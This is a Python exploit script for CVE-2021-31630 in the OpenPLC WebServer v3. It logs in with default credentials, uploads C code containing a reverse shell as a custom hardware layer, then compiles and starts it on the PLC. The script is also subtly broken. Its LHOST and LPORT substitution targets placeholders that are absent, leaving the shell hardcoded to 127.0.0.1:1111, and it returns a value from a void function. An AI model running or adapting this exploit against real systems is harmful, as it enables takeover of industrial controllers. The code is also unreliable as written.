#!/usr/bin/env python3

import sys
import argparse
import requests
from time import sleep

parser = argparse.ArgumentParser()
parser.add_argument('url', help='Target URL with http(s)://')
parser.add_argument('-u', help='Username', default='openplc')
parser.add_argument('-p', help='Password', default='openplc')
parser.add_argument('-t', help='Request Timeout, increase if server is slow', default=20)
parser.add_argument('-lh', help='LHOST', required=True)
parser.add_argument('-lp', help='LPORT', required=True)
args = parser.parse_args()


sess_obj = requests.Session()

TARGET = args.url
if not TARGET.startswith('http://') and not TARGET.startswith('https://'):
    print('[-] Invalid target, URL expected.')
    sys.exit()
if TARGET.endswith('/'):
    TARGET = TARGET[:-1]
login_url = f'{TARGET}/login'
upload_url = f'{TARGET}/hardware'
compile_url = f'{TARGET}/compile-program/file=blank_program.st'
stop_url = f'{TARGET}/stop_plc'
start_url = f'{TARGET}/start_plc'
restore_url = f'{TARGET}/restore_custom_hardware'
TOUT = args.t
UNAME = args.u
PSSWD = args.p
LHOST = args.lh
LPORT = args.lp


def health(session):
    rqst = session.get(TARGET, timeout=TOUT)
    if rqst.status_code == 200:
        print('[+] Service is Online!')
    else:
        print(f'[-] Status : {rqst.status_code}')
        sys.exit()


def login(session, username, password):
    payload = {
        'username': username,
        'password': password
    }
    rqst = session.post(login_url, data=payload, timeout=TOUT)
    if rqst.status_code == 200:
        if 'Bad credentials' in rqst.text:
            print('[-] Invalid Credentials!')
            sys.exit()
        else:
            print('[+] Logged in!')
    else:
        print(f'[-] Status : {rqst.status_code}')
        sys.exit()


def upload(session):
    template = '''
#include "ladder.h"
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int ignored_bool_inputs[] = {-1};
int ignored_bool_outputs[] = {-1};
int ignored_int_inputs[] = {-1};
int ignored_int_outputs[] = {-1};

void initCustomLayer(){}

void updateCustomIn(){}

void updateCustomOut()
{
    int port = 1111;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("127.0.0.1");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"sh", NULL};
    execvp("sh", argv);

    return 0;       
}
'''
    modded_template = template.replace('<IP>', LHOST).replace('<PORT>', LPORT).encode()
    payload = {
        'hardware_layer': (None, b'blank_linux'),
        'custom_layer_code': (None, modded_template)
    }
    rqst = session.post(upload_url, files=payload, timeout=TOUT)

    if rqst.status_code == 200:
        print('[+] Payload uploaded!')
        comp_rqst = session.get(compile_url, timeout=TOUT)
        if comp_rqst.status_code == 200:
            print('[+] Waiting for 5 seconds...')
            sleep(5)
            print('[+] Compilation successful!')
        else:
            print(f'[-] Status : {comp_rqst.status_code}')
            sys.exit()
    else:
        print(f'[-] Status : {rqst.status_code}')
        sys.exit()


def start(session):
    rqst = session.get(start_url, timeout=TOUT)
    if rqst.status_code == 200:
        print('[+] PLC Started! Check listener...')
    else:
        print(f'[-] Status : {rqst.status_code}')


def cleanup(session):
    stop_rqst = session.get(stop_url, timeout=TOUT)
    if stop_rqst.status_code == 200:
        print('[+] PLC Stopped!')
    else:
        print(f'Status : {stop_rqst.status_code}')
    clean_rqst = session.get(restore_url, timeout=TOUT)
    if clean_rqst.status_code == 200:
        sleep(10)
        print('[+] Cleanup successful!')
    else:
        print(f'Status : {clean_rqst.status_code}')
        sys.exit()


BANNER = '''
------------------------------------------------
--- CVE-2021-31630 -----------------------------
--- OpenPLC WebServer v3 - Authenticated RCE ---
------------------------------------------------


'''

print(BANNER)
print(f'[>] Target   : {TARGET}')
print(f'[>] Username : {UNAME}')
print(f'[>] Password : {PSSWD}')
print(f'[>] Timeout  : {TOUT} secs')
print(f'[>] LHOST    : {LHOST}')
print(f'[>] LPORT    : {LPORT}\n')

try:
    print('[!] Checking status...')
    health(sess_obj)
    print('[!] Logging in...')
    login(sess_obj, UNAME, PSSWD)
    sleep(1)
    print('[!] Restoring default program...')
    cleanup(sess_obj)
    sleep(1)
    print('[!] Uploading payload...')
    upload(sess_obj)
    print('[!] Starting PLC...')
    start(sess_obj)
    sleep(1)
    print('[!] Cleaning up...')
    cleanup(sess_obj)
except Exception as exc:
    print(f'[-] Exception : {exc}')
    sys.exit()
except KeyboardInterrupt:
    print('[!] Exiting...')
    sys.exit()
